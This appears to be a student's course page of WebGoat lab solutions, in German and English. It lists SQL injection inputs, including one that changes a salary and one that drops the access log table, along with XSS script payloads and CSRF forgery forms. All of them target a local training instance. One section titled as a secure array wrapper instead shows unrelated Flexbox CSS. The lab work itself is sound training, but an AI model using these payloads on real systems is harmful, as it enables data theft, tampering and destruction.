<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>12 Security</title>
    <link href="../index.css" rel="stylesheet">
    <script crossorigin="anonymous" src="https://kit.fontawesome.com/311699e670.js"></script>
    <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/styles/monokai-sublime.min.css"
          rel="stylesheet">
    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
    <script>hljs.configure({languages: ['javascript']})</script>
    <script>hljs.highlightAll();</script>
    <script>
        /* Toggle between adding and removing the "responsive" class to topnav when the user clicks on the icon
        * https://www.w3schools.com/howto/howto_js_topnav_responsive.asp */
        function myFunction() {
            var x = document.getElementById("mySidenav");
            if (x.className === "sidenav") {
                x.className += " responsive";
            } else {
                x.className = "sidenav";
            }
        }
    </script>
</head>
<body>
<div class="sidenav" id="mySidenav">
    <a href="../index.html" style="display: block"><i class="fa fa-home"></i></a>
    <a href="../01_Einfuehrung/uebung01.html" class="active">01 Einführung</a>
    <a href="../02_RWD/uebung02.html">02 RWD</a>
    <a href="../03_JavaScript/uebung03.html">03 JavaScript</a>
    <a href="../04_DOM/uebung04.html">04 DOM</a>
    <a href="../05_Async/uebung05.html">05 Async</a>
    <a href="../06_SVG/uebung06.html">06 SVG</a>
    <a href="../07_node/uebung07.html">07 Node</a>
    <a href="../08_ModularWeb/uebung08.html">08 ModularWeb</a>
    <a href="../09_PWA/uebung09.html">09 PWA</a>
    <a href="../10_Vue/uebung10.html">10 Vue</a>
    <a href="../11_WebAssembly/uebung11.html">11 WebAssembly</a>
    <a href="../12_Security/uebung12.html">12 Security</a>
    <a href="javascript:void(0);" class="icon" onclick="myFunction()">
        <i class="fa fa-bars"></i>
    </a>
</div>
<div class="main">
    <h1>Übung 12 - Security</h1>

    <details>
        <summary>12.1 Sicherer Array Wrapper
            <a style="display: inline;" href="" target="_blank">
                &nbsp;
                <i class="fas fa-external-link-alt"></i></a></summary>
        <button id="dfcodebutton" onclick="buttonChange('dfcode','dfcomp')">Code</button>
        <button disabled id="dfcompbutton" onclick="buttonChange('dfcomp', 'dfcode')">
            Komponente
        </button>

        <div id="dfcomp">
            <iframe frameborder="0" style="width: 100%; height: 100vh; margin-top: 1em; resize: both"
                    src=""></iframe>
        </div>
        <div id="dfcode" style="display: none">
                            <pre>
                                <code class="language-html">
    &lt;!DOCTYPE html>
    &lt;html lang="en">
    &lt;head>
        &lt;meta charset="UTF-8">
        &lt;title>Flexbox Desktop-First&lt;/title>
        &lt;style>
            * {
                box-sizing: border-box;
            }

            body {
                display: flex;
                flex-wrap: wrap;
                margin: 3vw 5vw 3vw 5vw;
                height: 90vh;
            }

            aside.right {
                flex-basis: 19%;
                background-color: #ea3efe;
                height: 68%;
            }

            aside.left {
                background-color: #2cee27;
                flex-basis: 19%;
                height: 68%;
            }

            article {
                flex-basis: 59.67%;
                height: 68%;
                background-color: #0533ff;
                margin: 0 1% 0 1%;
            }

            nav {
                background-color: #ff2500;
                flex-basis: 100%;
                height: 30%;
                margin-bottom: 1.5vw;
            }

            /* mid-size devices like tablets &lt;= 800px */
            @media screen and (max-width: 800px) {
                body{
                    margin: 5% 2% 5% 2%;
                }
                aside.left {
                    flex-basis: 33%;
                    height: 100%;
                    margin-right: 1%;
                }

                article {
                    flex-basis: 66%;
                    height: 100%;
                    margin: 0;
                }

                aside.right {
                    flex-basis: 100%;
                    height: 20%;
                    margin-top: 2%;
                }
            }

            /* small devices like smartphones &lt;= 500px */
            @media screen and (max-width: 500px) {
                nav{
                    flex-basis: 100%;
                    height: 20%;
                    margin: 0;
                }
                article {
                    flex-basis: 100%;
                    height: 150%;
                    margin: 0;

                }

                aside.left, aside.right {
                    flex-basis: 100%;
                    height: 20%;
                    margin: 0;

                }
            }

        &lt;/style>
    &lt;/head>
    &lt;body>
    &lt;nav>&lt;/nav>
    &lt;aside class="left">&lt;/aside>
    &lt;article>&lt;/article>
    &lt;aside class="right">&lt;/aside>
    &lt;/body>
    &lt;/html>
                                </code>
                            </pre>
        </div>

    </details>

    <details>
        <summary>12.2 WebGoat Injection</summary>
        <div>
                            <pre>
                                <code class="language-sql">
-- 2) Retrieve the department of the employee Bob Franco
SELECT department FROM employees WHERE first_name='Bob'

-- 3) Change the department of Tobi Barnett to 'Sales'
UPDATE employees SET department = 'Sales' WHERE first_name = 'Tobi' AND last_name = 'Barnett'

-- 4) Modify the schema by adding the column "phone" (varchar(20)) to the table "employees.
ALTER TABLE employees ADD phone varchar(20)

-- 5) Grant rights to the table grant_rights to user unauthorized_user
GRANT ALL ON grant_rights TO unauthorized_user

-- 9) String SQL injection: Retrieve all the users from the users table.
SELECT * FROM user_data WHERE first_name = 'John' AND last_name = 'Smith' OR '1' = '1'

-- 10) Numeric SQL injection: Retrieve all the data from the users table.
Login_Count: 0
User_Id: 0 OR 1=1

-- 11) Retrieve all employee data from the employees table.
Employee Name: Smith
TAN: ' OR '1'='1

-- 12) Change your own salary so you are earning the most!
Employee name: A
Authentication TAN:'; UPDATE employees SET salary=9999 WHERE first_name='John' AND last_name='Smith

-- 13) Delete the access log.
%'; DROP TABLE access_log;--
                                </code>
                            </pre>
        </div>

    </details>

    <details>
        <summary>12.3 WebGoat XSS</summary>
        <div>
                            <pre>
                                <code>
2) Were the cookies the same on each tab?
    Yes.

7) Use the alert() or console.log() methods to find out which field is vulnerable
    Credit Card Number: &lt;script>alert()&lt;/script>

10) What is the route for the test code that stayed in the app during production?
    start.mvc#test

11) Use the route you just found and see if you can use the fact that it reflects a parameter from the route without
encoding to execute an internal function in WebGoat. The function you want to execute is webgoat.customjs.phoneHome().
    http://127.0.0.1:8080/WebGoat/start.mvc#test/%3Cscript%3Ewebgoat.customjs.phoneHome()%3C%2Fscript%3E
    Ergebniszahl: -1550996069


12) Quiz:
1. Are trusted websites immune to XSS attacks?
 4 - No, because the browser trusts the website if it is acknowledged trusted, then the browser does not know that the script is malicious.

2. When do XSS attacks occur?
 3 - The data is included in dynamic content that is sent to a web user without being validated for malicious content.

3. What are Stored XSS attacks?
 1 - The script is permanently stored on the server and the victim gets the malicious script when requesting information from the server.

4. What are Reflected XSS attacks?
 2 - They reflect the injected script off the web server. That occurs when input sent to the web server is part of the request.

5. Is JavaScript the only way to perform XSS attacks?
 4 - No there are many other ways. Like HTML, Flash or any other type of code that the browser executes.
                                </code>
                            </pre>
        </div>

    </details>

    <details>
        <summary>12.4 WebGoat Cross-Site Request Forgeries</summary>
        <div>
                            <pre>
3) Basic Get CSRF Exercise:Trigger the form from an external source while logged in.
                                <code class="language-html">
    &lt;!DOCTYPE html>
    &lt;html lang="en">
    &lt;head>
        &lt;meta charset="UTF-8">
        &lt;title>CSRF&lt;/title>
    &lt;/head>
    &lt;body>
    &lt;form action="http://127.0.0.1:8080/WebGoat/csrf/basic-get-flag" method="POST">
        &lt;input type="hidden" name='csrf' value='true'>
        &lt;input type="submit" name="submit">
    &lt;/form>
    &lt;/body>
    &lt;/html>
                                </code>
4) Post a review on someone else’s behalf
                                <code class="language-html">
    &lt;!DOCTYPE html>
    &lt;html lang="en">
    &lt;head>
    &lt;meta charset="UTF-8">
    &lt;title>CSRF 4&lt;/title>
    &lt;/head>
    &lt;body>
    &lt;form class="attack-form" accept-charset="UNKNOWN" id="csrf-review" method="POST" name="review-form"
    successcallback="" action="http://127.0.0.1:8080/WebGoat/csrf/review">
    &lt;input class="form-control" id="reviewText" name="reviewText" value="lol" type="text">
    &lt;input type="hidden" class="form-control" id="reviewStars" name="stars" value="0">
    &lt;input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
    &lt;input type="submit" name="submit" value="Submit review">
    &lt;/form>
    &lt;/body>
    &lt;/html>
                                </code>
7) CSRF and content-type. POST JSON message to our endpoints...
                                <code class="language-html">
    &lt;html>
    &lt;body>
    &lt;form action=http://127.0.0.1:8080/WebGoat/csrf/feedback/message method=post enctype="text/plain">
        &lt;input name=' {"name": "WebGoat", "email": "webgoat@webgoat.org", "content": "WebGoat is the best!!", "ignore_me":" '
               value='test"}' type='hidden'>
        &lt;input type='submit' value='Submit'>
    &lt;/form>
    &lt;/body>
    &lt;/html>
                                </code>
                            </pre>
        </div>
    </details>
</div>
<script>
    function buttonChange(own, other) {
        document.getElementById(own).style.display = 'block';
        document.getElementById(other).style.display = 'none'
        document.getElementById(own + 'button').disabled = true;
        document.getElementById(other + 'button').disabled = false;
    }
</script>
</body>
</html>